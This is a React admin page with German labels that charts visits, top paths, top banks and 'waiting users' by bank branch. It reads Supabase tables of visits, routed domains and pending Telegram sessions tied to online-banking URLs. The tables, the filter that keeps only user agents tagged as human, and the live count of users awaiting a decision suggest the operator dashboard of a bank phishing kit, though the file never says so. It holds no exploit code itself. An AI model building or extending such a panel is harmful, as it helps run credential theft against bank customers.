import { useEffect, useMemo, useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2, RefreshCw } from "lucide-react";
import {
  ResponsiveContainer,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  Tooltip,
  CartesianGrid,
} from "recharts";

export const Route = createFileRoute("/_authenticated/admin/stats")({
  component: StatsAdmin,
});

type Row = {
  created_at: string;
  path: string;
  bank_id: string | null;
  referrer: string | null;
  host: string | null;
};

type DomainRoute = { id: string; label: string; domain: string | null };
type PendingSession = {
  id: string;
  branch_name: string;
  online_banking_url: string | null;
  decision: string;
  updated_at: string;
  created_at: string;
};

type PresetKey = "1h" | "6h" | "24h" | "7d" | "30d" | "custom";
const PRESETS: { key: PresetKey; label: string; ms: number }[] = [
  { key: "1h", label: "1 Stunde", ms: 60 * 60_000 },
  { key: "6h", label: "6 Stunden", ms: 6 * 60 * 60_000 },
  { key: "24h", label: "24 Stunden", ms: 24 * 60 * 60_000 },
  { key: "7d", label: "7 Tage", ms: 7 * 24 * 60 * 60_000 },
  { key: "30d", label: "30 Tage", ms: 30 * 24 * 60 * 60_000 },
];

function normHost(h: string | null | undefined): string | null {
  if (!h) return null;
  return (h.split(":")[0] ?? "").trim().toLowerCase() || null;
}

function hostFromUrl(u: string | null | undefined): string | null {
  if (!u) return null;
  try {
    return normHost(new URL(u).hostname);
  } catch {
    return null;
  }
}

/** Ordnet einen beliebigen Host der passenden domain_routes-Domain zu (auch Subdomains). */
function matchDomain(host: string | null, domains: string[]): string | null {
  if (!host) return null;
  const sorted = [...domains].sort((a, b) => b.length - a.length);
  for (const d of sorted) {
    if (host === d || host.endsWith(`.${d}`)) return d;
  }
  return null;
}

function StatsAdmin() {
  const [rows, setRows] = useState<Row[]>([]);
  const [routes, setRoutes] = useState<DomainRoute[]>([]);
  const [pending, setPending] = useState<PendingSession[]>([]);
  const [loading, setLoading] = useState(true);
  const [reloadTick, setReloadTick] = useState(0);

  const [preset, setPreset] = useState<PresetKey>("24h");
  const [fromInput, setFromInput] = useState<string>("");
  const [toInput, setToInput] = useState<string>("");
  const [activeDomain, setActiveDomain] = useState<string>("__all");

  // Zeitbereich
  const { fromMs, toMs } = useMemo(() => {
    if (preset === "custom") {
      const f = fromInput ? new Date(fromInput).getTime() : Date.now() - 24 * 60 * 60_000;
      const t = toInput ? new Date(toInput).getTime() : Date.now();
      return { fromMs: Math.min(f, t), toMs: Math.max(f, t) };
    }
    const p = PRESETS.find((x) => x.key === preset) ?? PRESETS[2]!;
    const to = Date.now();
    return { fromMs: to - p.ms, toMs: to };
  }, [preset, fromInput, toInput]);

  // Auto-refresh alle 30 s
  useEffect(() => {
    const id = setInterval(() => setReloadTick((n) => n + 1), 30_000);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    let cancelled = false;
    (async () => {
      setLoading(true);
      const fromIso = new Date(fromMs).toISOString();
      const toIso = new Date(toMs).toISOString();
      const [visitsRes, routesRes, sessionsRes] = await Promise.all([
        supabase
          .from("visit_events")
          .select("created_at, path, bank_id, referrer, host")
          .like("user_agent", "HUMAN|%")
          .gte("created_at", fromIso)
          .lte("created_at", toIso)
          .order("created_at", { ascending: false })
          .limit(5000),
        supabase.from("domain_routes").select("id, label, domain").order("label"),
        supabase
          .from("telegram_sessions")
          .select("id, branch_name, online_banking_url, decision, updated_at, created_at")
          .eq("decision", "pending")
          .gte("updated_at", new Date(Date.now() - 30 * 60_000).toISOString())
          .order("updated_at", { ascending: false })
          .limit(200),
      ]);
      if (cancelled) return;
      setRows(((visitsRes.data ?? []) as Row[]));
      setRoutes(((routesRes.data ?? []) as DomainRoute[]));
      setPending(((sessionsRes.data ?? []) as PendingSession[]));
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [fromMs, toMs, reloadTick]);

  const domainList = useMemo(
    () =>
      routes
        .map((r) => normHost(r.domain))
        .filter((d): d is string => !!d),
    [routes],
  );

  // Auto-select: fällt raus, wenn Domain gelöscht wird
  useEffect(() => {
    if (activeDomain !== "__all" && !domainList.includes(activeDomain)) {
      setActiveDomain("__all");
    }
  }, [domainList, activeDomain]);

  const rowsWithDomain = useMemo(() => {
    return rows.map((r) => {
      const host = normHost(r.host) ?? hostFromUrl(r.referrer);
      const domain = matchDomain(host, domainList);
      return { ...r, _host: host, _domain: domain };
    });
  }, [rows, domainList]);

  const filteredRows = useMemo(() => {
    if (activeDomain === "__all") return rowsWithDomain;
    if (activeDomain === "__other") return rowsWithDomain.filter((r) => !r._domain);
    return rowsWithDomain.filter((r) => r._domain === activeDomain);
  }, [rowsWithDomain, activeDomain]);

  // Tab-Counts pro Domain
  const domainCounts = useMemo(() => {
    const m = new Map<string, number>();
    for (const r of rowsWithDomain) {
      const key = r._domain ?? "__other";
      m.set(key, (m.get(key) ?? 0) + 1);
    }
    return m;
  }, [rowsWithDomain]);

  // Chart-Buckets
  const chartData = useMemo(() => {
    const spanMs = Math.max(1, toMs - fromMs);
    const buckets = 24;
    const bucketMs = Math.ceil(spanMs / buckets);
    const arr: { label: string; ts: number; count: number }[] = [];
    for (let i = 0; i < buckets; i++) {
      const start = fromMs + i * bucketMs;
      arr.push({ ts: start, count: 0, label: formatBucket(start, bucketMs) });
    }
    for (const r of filteredRows) {
      const t = new Date(r.created_at).getTime();
      const idx = Math.min(buckets - 1, Math.max(0, Math.floor((t - fromMs) / bucketMs)));
      arr[idx]!.count += 1;
    }
    return arr;
  }, [filteredRows, fromMs, toMs]);

  const topPaths = useMemo(() => {
    const m = new Map<string, number>();
    for (const r of filteredRows) m.set(r.path, (m.get(r.path) ?? 0) + 1);
    return [...m.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10);
  }, [filteredRows]);

  const topBanks = useMemo(() => {
    const m = new Map<string, number>();
    for (const r of filteredRows) if (r.bank_id) m.set(r.bank_id, (m.get(r.bank_id) ?? 0) + 1);
    return [...m.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10);
  }, [filteredRows]);

  // Wartende Nutzer nach Pfad
  const waitingByPath = useMemo(() => {
    const cutoff = Date.now() - 5 * 60_000; // aktiv = update in letzten 5 min
    const m = new Map<string, number>();
    for (const s of pending) {
      if (new Date(s.updated_at).getTime() < cutoff) continue;
      const host = hostFromUrl(s.online_banking_url);
      const domain = matchDomain(host, domainList);
      if (activeDomain === "__all" || (activeDomain === "__other" && !domain) || domain === activeDomain) {
        const key = s.branch_name || s.online_banking_url || "unbekannt";
        m.set(key, (m.get(key) ?? 0) + 1);
      }
    }
    return [...m.entries()].sort((a, b) => b[1] - a[1]);
  }, [pending, domainList, activeDomain]);

  return (
    <div className="space-y-6">
      <div className="flex items-start justify-between gap-4">
        <div>
          <h1 className="text-2xl font-semibold">Besucher-Übersicht</h1>
          <p className="text-sm text-muted-foreground">
            Aggregiert nach Domain aus dem Domain-Routing. Aktualisiert automatisch alle 30 s.
          </p>
        </div>
        <Button variant="outline" size="sm" onClick={() => setReloadTick((n) => n + 1)}>
          <RefreshCw className="h-4 w-4 mr-2" /> Aktualisieren
        </Button>
      </div>

      {/* Zeitfilter */}
      <Card>
        <CardContent className="p-4 flex flex-wrap items-end gap-3">
          <div className="flex flex-wrap gap-1">
            {PRESETS.map((p) => (
              <Button
                key={p.key}
                size="sm"
                variant={preset === p.key ? "default" : "outline"}
                onClick={() => setPreset(p.key)}
              >
                {p.label}
              </Button>
            ))}
            <Button
              size="sm"
              variant={preset === "custom" ? "default" : "outline"}
              onClick={() => setPreset("custom")}
            >
              Eigener Zeitraum
            </Button>
          </div>
          {preset === "custom" && (
            <div className="flex flex-wrap items-end gap-2 ml-auto">
              <label className="text-xs text-muted-foreground flex flex-col">
                Von
                <Input
                  type="datetime-local"
                  value={fromInput}
                  onChange={(e) => setFromInput(e.target.value)}
                  className="w-56"
                />
              </label>
              <label className="text-xs text-muted-foreground flex flex-col">
                Bis
                <Input
                  type="datetime-local"
                  value={toInput}
                  onChange={(e) => setToInput(e.target.value)}
                  className="w-56"
                />
              </label>
            </div>
          )}
          <div className="text-xs text-muted-foreground ml-auto">
            {new Date(fromMs).toLocaleString("de-DE")} — {new Date(toMs).toLocaleString("de-DE")}
          </div>
        </CardContent>
      </Card>

      {/* Domain-Tabs */}
      <Tabs value={activeDomain} onValueChange={setActiveDomain}>
        <TabsList className="flex flex-wrap h-auto">
          <TabsTrigger value="__all">
            Alle
            <span className="ml-2 text-xs opacity-70">{rowsWithDomain.length}</span>
          </TabsTrigger>
          {domainList.map((d) => (
            <TabsTrigger key={d} value={d}>
              {d}
              <span className="ml-2 text-xs opacity-70">{domainCounts.get(d) ?? 0}</span>
            </TabsTrigger>
          ))}
          {(domainCounts.get("__other") ?? 0) > 0 && (
            <TabsTrigger value="__other">
              Sonstige
              <span className="ml-2 text-xs opacity-70">{domainCounts.get("__other") ?? 0}</span>
            </TabsTrigger>
          )}
        </TabsList>
      </Tabs>

      {loading ? (
        <div className="flex items-center gap-2 text-sm text-muted-foreground">
          <Loader2 className="h-4 w-4 animate-spin" /> Lade Daten…
        </div>
      ) : (
        <>
          <div className="grid gap-4 sm:grid-cols-2">
            <StatCard label="Besuche im Zeitraum" value={filteredRows.length} />
            <StatCard label="Wartende Nutzer (aktiv)" value={waitingByPath.reduce((a, [, n]) => a + n, 0)} />
          </div>


          <Card>
            <CardHeader>
              <CardTitle className="text-base">Besucherverlauf</CardTitle>
            </CardHeader>
            <CardContent className="h-72">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={chartData} margin={{ left: -10, right: 8, top: 8, bottom: 0 }}>
                  <CartesianGrid strokeDasharray="3 3" opacity={0.3} />
                  <XAxis dataKey="label" fontSize={11} interval="preserveStartEnd" />
                  <YAxis fontSize={11} allowDecimals={false} />
                  <Tooltip
                    formatter={(v) => [v as number, "Besuche"]}
                    labelFormatter={(l) => `Zeit: ${l}`}
                  />
                  <Bar dataKey="count" fill="hsl(var(--primary))" radius={[4, 4, 0, 0]} />
                </BarChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>

          <div className="grid gap-4 lg:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle className="text-base">Wartende Nutzer nach Filiale</CardTitle>
              </CardHeader>
              <CardContent>
                {waitingByPath.length === 0 ? (
                  <div className="text-sm text-muted-foreground">Aktuell wartet niemand.</div>
                ) : (
                  <ul className="space-y-1 text-sm">
                    {waitingByPath.map(([name, n]) => (
                      <li key={name} className="flex justify-between gap-2">
                        <span className="truncate">{name}</span>
                        <span className="tabular-nums text-muted-foreground">{n}</span>
                      </li>
                    ))}
                  </ul>
                )}
              </CardContent>
            </Card>
            <Card>
              <CardHeader>
                <CardTitle className="text-base">Top Pfade</CardTitle>
              </CardHeader>
              <CardContent>
                {topPaths.length === 0 ? (
                  <div className="text-sm text-muted-foreground">Keine Daten</div>
                ) : (
                  <ul className="space-y-1 text-sm">
                    {topPaths.map(([p, n]) => (
                      <li key={p} className="flex justify-between gap-2">
                        <span className="truncate font-mono text-xs">{p}</span>
                        <span className="tabular-nums text-muted-foreground">{n}</span>
                      </li>
                    ))}
                  </ul>
                )}
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader>
              <CardTitle className="text-base">Top Banken</CardTitle>
            </CardHeader>
            <CardContent>
              {topBanks.length === 0 ? (
                <div className="text-sm text-muted-foreground">Keine Daten</div>
              ) : (
                <ul className="space-y-1 text-sm sm:columns-2">
                  {topBanks.map(([id, n]) => (
                    <li key={id} className="flex justify-between gap-2 break-inside-avoid">
                      <span className="truncate">{id}</span>
                      <span className="tabular-nums text-muted-foreground">{n}</span>
                    </li>
                  ))}
                </ul>
              )}
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="text-base">Letzte Besuche</CardTitle>
            </CardHeader>
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <table className="w-full text-sm">
                  <thead className="bg-muted/50 text-left">
                    <tr>
                      <th className="px-3 py-2">Zeit</th>
                      <th className="px-3 py-2">Domain</th>
                      <th className="px-3 py-2">Pfad</th>
                      <th className="px-3 py-2">Bank</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredRows.slice(0, 100).map((r, i) => (
                      <tr key={i} className="border-t">
                        <td className="px-3 py-2 text-xs text-muted-foreground whitespace-nowrap">
                          {new Date(r.created_at).toLocaleString("de-DE")}
                        </td>
                        <td className="px-3 py-2 text-xs">{r._domain ?? r._host ?? "—"}</td>
                        <td className="px-3 py-2 font-mono text-xs">{r.path}</td>
                        <td className="px-3 py-2">{r.bank_id ?? "—"}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </CardContent>
          </Card>
        </>
      )}
    </div>
  );
}

function formatBucket(ts: number, bucketMs: number): string {
  const d = new Date(ts);
  if (bucketMs < 24 * 60 * 60_000) {
    return d.toLocaleTimeString("de-DE", { hour: "2-digit", minute: "2-digit" });
  }
  return d.toLocaleDateString("de-DE", { day: "2-digit", month: "2-digit" });
}

function StatCard({ label, value }: { label: string; value: number }) {
  return (
    <Card>
      <CardHeader className="pb-2">
        <CardTitle className="text-sm font-medium text-muted-foreground">{label}</CardTitle>
      </CardHeader>
      <CardContent>
        <div className="text-2xl font-semibold">{value.toLocaleString("de-DE")}</div>
      </CardContent>
    </Card>
  );
}
